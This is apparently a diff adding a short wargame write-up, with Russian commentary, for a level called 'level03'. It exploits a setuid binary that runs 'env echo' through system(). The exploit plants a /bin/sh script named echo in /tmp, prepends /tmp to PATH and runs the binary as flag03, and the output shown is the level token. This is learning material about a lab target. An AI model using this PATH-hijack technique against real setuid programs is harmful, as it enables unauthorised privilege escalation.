@@ -1,0 +1,26 @@
+level03
+
+$ ls -la
+...
+-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
+...
+
+$ strings ./level03
+...
+system
+...
+/usr/bin/env echo Exploit me.
+...
+
+Таким образом, мы можем видеть, что он использует /usr/bin/env echo Exploit Me в вызове system (). Основная идея состоит в том, чтобы заменить echo оболочкой, чтобы мы могли выполнять двоичные файлы как flag03 (в частности, двоичный файл getflag). Мы знаем, что можем создавать файлы в /tmp и изменять переменную ПУТИ, чтобы двоичные файлы сначала искали в папке /tmp.
+
+$ cat > /tmp/echo <<EOF
+/bin/sh
+EOF
+$ chmod +x /tmp/echo
+$ export PATH=/tmp:$PATH
+$ ./level03
+
+
+Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
+
